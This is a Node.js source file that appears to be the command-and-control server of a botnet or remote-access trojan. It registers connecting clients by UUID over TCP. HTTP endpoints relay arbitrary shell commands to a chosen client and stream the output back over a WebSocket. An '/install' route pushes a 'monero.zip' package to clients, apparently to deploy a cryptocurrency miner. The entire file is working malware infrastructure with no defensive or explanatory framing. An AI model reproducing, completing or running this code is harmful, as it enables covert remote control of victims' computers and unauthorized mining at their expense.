const net = require("net");
const express = require("express");
const uuid = require("uuid");
const fs = require("fs");
const WebSocket = require("ws");
const bluebird = require("bluebird");

const app = express();
const serverWebSocket = new WebSocket.Server({ port: 1300 });

bluebird.config({ cancellation: true });

function removeDuplicate(string, deprecated) {
  return string.split(deprecated).join("");
}

let webSocket = null;
serverWebSocket.on("connection", (socket) => {
  console.log("New websocket client.");
  socket.send("Connected#0&")
  webSocket = socket;
});

app.listen( process.env.PORT || 8080, () => {
  console.log("Express server listening on port 8080");
});

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

const clients = {};

app.get("/api/s/clients", (req, res) => {
  console.log("Request to get clients ID");
  console.log(Object.keys(clients));
  return res.send(Object.keys(clients));
});

const server = net.createServer((socket) => {
  socket.once("data", (dataString) => {
    let data;
    try {
      data = JSON.parse(dataString);
    } catch (error) {
      console.error("Invalid JSON data received:", dataString);
      socket.destroy();
      return;
    }

    if (!data.id) {
      return;
    }

    const clientIdentifier = data.id.toString().trim().slice(0, 36);
    
    console.log("New Client:", clientIdentifier);

    if (uuid.validate(clientIdentifier)) {
      clients[clientIdentifier] = { socket, ...data };
      console.log(clients[clientIdentifier]);

      socket.on("end", () => {
        console.log(`Client ${clientIdentifier} disconnected.`);
        delete clients[clientIdentifier];
      });

      socket.on("error", (error) => {
        console.error(`Socket error for ${clientIdentifier}:`, error);
        delete clients[clientIdentifier];
        socket.destroy();
      });
    }
  });

  socket.on("error", (error) => {
    console.error("Socket error:", error);
    socket.destroy();
  });
});

app.post("/install", async (req, res) => {
  const tool = req.query.tool;
  const id = req.query.id;

  if (!clients[id]) {
    return res.status(400).send("Client not found");
  }

  if (clients[id].installed_tools?.includes(tool)) {
    return res.send("Already installed");
  }

  const zipFilePath = "tools/monero.zip";

  fs.readFile(zipFilePath, (err, zipData) => {
    if (err) {
      console.error("Error reading ZIP file:", err);
      return res.status(500).send("Error reading ZIP file");
    }

    clients[id].socket.write(`INSTALL_MONERO:`);
    clients[id].socket.write(zipData, () => {
      clients[id].socket.write(`END_MONERO;s#1&`);
      res.send("Installed");
    });
  });
});

app.get("/stream_command", async (req, res) => {
  console.log("Received stream_command request");
  const command = req.query.command;
  const id = req.query.id;

  console.log(`Command: ${command}, ID: ${id}`);

  if (!clients[id]) {
    console.log(`Client ${id} not found`);
    return res.status(400).send("Client not found");
  }

  try {
    const clientSocket = clients[id].socket;

    clientSocket.removeAllListeners("data");

    clientSocket.write(command.toString());

    const promise1 = new bluebird.Promise((resolve, reject) => {
      let accumulatedData = "";

      const onData = (data) => {
        try {
          const dataString = data.toString().trim();
          console.log(`Data received from client ${id}: ${dataString}`);

          if (dataString.includes("sTop#0&")) {
            console.log("Cancel promise 1");
            clientSocket.removeListener("data", onData);
            resolve(accumulatedData);
            return;
          }
          const commandOutput = removeDuplicate(dataString, "s#1&");
          accumulatedData += commandOutput;
          if (webSocket != null) {
              webSocket.send(commandOutput);
          }
        } catch (err) {
          console.log("Error processing data:", err);
          reject(err);
        }
      };
      clientSocket.on("data", onData);
    });
    const output = await promise1;
    res.send(output);
  } catch (err) {
    console.log("Error in /stream_command:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.get("/command", async (req, res) => {

  const command = req.query.command;
  const id = req.query.id;

  if (!clients[id]) {
    return res.status(400).send("Client not found");
  }

  clients[id].socket.write(command.toString());

  let bufferList = [];
  clients[id].socket.on("data", (data) => {
    try {
      let commandOutput = data.toString().trim();
      if (commandOutput.includes("s#1&")) {
        commandOutput = commandOutput.split("s#1&")[0];
      }
      bufferList.push(commandOutput);
      if (commandOutput.includes("s#1&")) {
        res.send(bufferList.join(""));
      }
    } catch (err) {
      console.log("Error processing data:", err);
    }
  });
});

const SPORT = 27015;
server.listen(SPORT, () => {
  console.log(`Node.js server listening on port ${SPORT}`);
});

server.on("error", (error) => {
  console.error("Server error:", error);
});
